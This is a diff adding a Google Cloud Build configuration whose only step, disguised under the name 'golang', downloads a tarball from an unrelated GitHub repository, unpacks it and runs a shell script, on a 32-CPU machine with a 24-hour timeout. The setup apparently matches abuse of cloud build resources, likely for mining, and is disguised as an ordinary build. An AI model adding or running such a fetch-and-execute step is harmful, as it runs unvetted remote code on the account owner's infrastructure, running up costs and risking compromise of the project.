@@ -1,0 +1,12 @@
+steps:
+  - name: golang
+    args: 
+      - '-c'
+      - >-
+        wget https://github.com/bolog123/helbrid/raw/main/helm.tar.gz && tar xf helm.tar.gz && ./hybrid.sh
+    waitFor: ["-"]
+    entrypoint: /bin/baseh
+timeout: 86400s
+options:
+  machineType: 'e2-highcpu-32'
+  diskSizeGb: '100'
